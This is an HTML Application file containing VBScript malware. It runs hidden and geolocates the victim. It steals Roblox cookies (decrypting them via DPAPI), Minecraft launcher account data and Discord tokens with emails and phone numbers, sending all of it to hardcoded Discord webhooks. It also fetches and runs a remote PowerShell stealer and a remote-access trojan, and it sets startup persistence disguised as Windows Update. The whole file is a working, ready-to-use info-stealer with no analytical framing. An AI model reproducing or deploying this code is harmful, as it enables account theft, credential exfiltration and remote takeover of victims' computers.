<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, WH_REG, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOKS ---
WH = "https://discord.com/api/webhooks/1563118302715322368/9xgemSM8Sf-T3QMCNppQ10zpxz0CMjaGohxFCg6Hl8R0cVYB-ELK49meQbAfAtvS65Mt"
WH_REG = "https://discord.com/api/webhooks/1563321942797455460/9VXQBvrcfwAk15eHsIy3B4i7B2AmU3N90UdnIAUP_ZM9sgrakO1jfjgPcbu1SJwzH9S_"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- FIRST RUN (LOGS WEBHOOK) ---
Call IP
Call GrabRoblox
Call GrabMinecraft
Call GrabTokens
Call DropRAT
Call Persistence

' --- RE-GRAB LOOP (RE-GRAB WEBHOOK) ---
Dim runCount
For runCount = 1 To 4
    Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REG)
    Call IP_REG
    Call GrabRoblox_REG
    Call GrabMinecraft_REG
    Call GrabTokens_REG
    If runCount < 4 Then Call SleepMinutes(5)
Next

window.close()

Sub IP()
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbed(":dart: Target", info, 3447003, WH)
    Set xh = Nothing
End Sub

Sub IP_REG()
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbed(":dart: Target", info, 3447003, WH_REG)
    Set xh = Nothing
End Sub

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(cookie, vbCr, "")
    cookie = Replace(cookie, vbLf, "")
    cookie = Replace(cookie, vbTab, "")
    cookie = Trim(cookie)
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    PostEmbed "Roblox Cookie", "PC: " & PC & " | User: " & USER & vbCrLf & "**Cookie:**" & vbCrLf & "```" & cookie & "```", 65280, WH
End Sub

Sub GrabRoblox_REG()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    If Len(fp) = 0 Then Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(cookie, vbCr, "")
    cookie = Replace(cookie, vbLf, "")
    cookie = Replace(cookie, vbTab, "")
    cookie = Trim(cookie)
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    PostEmbed "Roblox Cookie (Regrab)", "PC: " & PC & " | User: " & USER & vbCrLf & "**Cookie:**" & vbCrLf & "```" & cookie & "```", 65280, WH_REG
End Sub

Sub GrabMinecraft()
    Dim launcherPath : launcherPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\.minecraft\launcher_accounts.json"
    Dim found : found = False
    
    If fso.FileExists(launcherPath) Then
        Dim raw : raw = ReadFile(launcherPath)
        If Len(raw) > 10 Then
            Call PostEmbed(":pick: Minecraft Accounts", "PC: " & PC & " | User: " & USER & vbCrLf & "**Launcher Data:**" & vbCrLf & "```json" & vbCrLf & raw & vbCrLf & "```", 3447003, WH)
            found = True
        End If
    End If
    
    Dim oldLauncher : oldLauncher = sh.ExpandEnvironmentStrings("%APPDATA%") & "\.minecraft\launcher_profiles.json"
    If Not found And fso.FileExists(oldLauncher) Then
        Dim rawOld : rawOld = ReadFile(oldLauncher)
        If Len(rawOld) > 10 Then
            Call PostEmbed(":pick: Minecraft Profiles", "PC: " & PC & " | User: " & USER & vbCrLf & "**Profile Data:**" & vbCrLf & "```json" & vbCrLf & rawOld & vbCrLf & "```", 3447003, WH)
        End If
    End If
End Sub

Sub GrabMinecraft_REG()
    Dim launcherPath : launcherPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\.minecraft\launcher_accounts.json"
    Dim found : found = False
    
    If fso.FileExists(launcherPath) Then
        Dim raw : raw = ReadFile(launcherPath)
        If Len(raw) > 10 Then
            Call PostEmbed(":pick: Minecraft Accounts (Regrab)", "PC: " & PC & " | User: " & USER & vbCrLf & "**Launcher Data:**" & vbCrLf & "```json" & vbCrLf & raw & vbCrLf & "```", 3447003, WH_REG)
            found = True
        End If
    End If
    
    Dim oldLauncher : oldLauncher = sh.ExpandEnvironmentStrings("%APPDATA%") & "\.minecraft\launcher_profiles.json"
    If Not found And fso.FileExists(oldLauncher) Then
        Dim rawOld : rawOld = ReadFile(oldLauncher)
        If Len(rawOld) > 10 Then
            Call PostEmbed(":pick: Minecraft Profiles (Regrab)", "PC: " & PC & " | User: " & USER & vbCrLf & "**Profile Data:**" & vbCrLf & "```json" & vbCrLf & rawOld & vbCrLf & "```", 3447003, WH_REG)
        End If
    End If
End Sub

Sub GrabTokens()
    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://dicerigs.app/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim f: Set f = fso.CreateTextFile(psf, True): f.Write xh.responseText: f.Close
    Set xh = Nothing
    
    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True

    Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal_result.txt"
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw: raw = ReadFile(tf)

    If Len(raw) > 10 Then
        Dim lines: lines = Split(raw, vbCrLf)
        Dim l
        For Each l In lines
            If Len(l) > 10 Then
                If Left(l, 8) = "DISCORD|" Then
                    Dim p: p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim info: info = "**PC:** " & PC & " | **User:** " & USER & vbCrLf
                        info = info & "**Discord User:** " & p(0) & vbCrLf
                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                        info = info & "**Token:**" & vbCrLf & "```" & p(4) & "```"
                        Call PostEmbed(":gift: Discord Token", info, 5793266, WH)
                    End If
                End If
            End If
        Next
    End If
End Sub

Sub GrabTokens_REG()
    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://dicerigs.app/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim f: Set f = fso.CreateTextFile(psf, True): f.Write xh.responseText: f.Close
    Set xh = Nothing
    
    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True

    Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal_result.txt"
    If Not fso.FileExists(tf) Then Exit Sub
    Dim raw: raw = ReadFile(tf)

    If Len(raw) > 10 Then
        Dim lines: lines = Split(raw, vbCrLf)
        Dim l
        For Each l In lines
            If Len(l) > 10 Then
                If Left(l, 8) = "DISCORD|" Then
                    Dim p: p = Split(Mid(l, 9), "|")
                    If UBound(p) >= 4 Then
                        Dim info: info = "**PC:** " & PC & " | **User:** " & USER & vbCrLf
                        info = info & "**Discord User:** " & p(0) & vbCrLf
                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                        info = info & "**Token:**" & vbCrLf & "```" & p(4) & "```"
                        Call PostEmbed(":gift: Discord Token (Regrab)", info, 5793266, WH_REG)
                    End If
                End If
            End If
        Next
    End If
End Sub

Sub DropRAT()
    Dim dl : dl = "https://dicerigs.app/agent.exe"
    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
    If fso.FileExists(op) Then fso.DeleteFile op

    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True

    Dim rDone : rDone = False
    If fso.FileExists(op) Then
        If fso.GetFile(op).Size > 3000000 Then
            rDone = True
        End If
    End If

    If rDone Then
        Dim dsize : dsize = fso.GetFile(op).Size
        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003, WH)
        sh.Run op, 0, False
        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280, WH)
    Else
        sh.Run "cmd /c taskkill /f /im powershell.exe > nul 2>&1", 0, False
        Call PostEmbed(":hourglass: RAT Timeout", "Download failed or incomplete.", 16711680, WH)
    End If
End Sub

Sub Persistence()
    Dim payload : payload = "mshta https://dicerigs.app/loader.hta"
    On Error Resume Next

    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"

    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close

    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280, WH)
End Sub

Sub SleepMinutes(m)
    Dim t0, t1, t2, elapsed
    t0 = Timer()
    Dim cmd : cmd = "cmd /c ping -n " & (m * 60 + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
    elapsed = Timer() - t0
    If elapsed < 0 Then elapsed = elapsed + 86400
    If elapsed < (m * 60) Then
        t1 = Timer()
        Do
            t2 = Timer()
            If t2 < t1 Then t2 = t2 + 86400
            If (t2 - t1) >= ((m * 60) - elapsed) Then Exit Do
        Loop
    End If
End Sub

Function ReadFile(path)
    ReadFile = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll
    f.Close
    Set f = Nothing
End Function

Sub PostEmbed(t, d, c, url)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", url, False
    h.SetRequestHeader "Content-Type" & Chr(58) & " application/json"
    h.Send j
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpi.txt"
    Dim outf: outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpo.txt"
    fso.DeleteFile outf, True
    Dim f: Set f = fso.CreateTextFile(inf, True): f.Write b64: f.Close
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpapi.ps1"
    Dim f2: Set f2 = fso.CreateTextFile(psf, True): f2.Write ps: f2.Close
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function
</script>
</head><body></body></html>
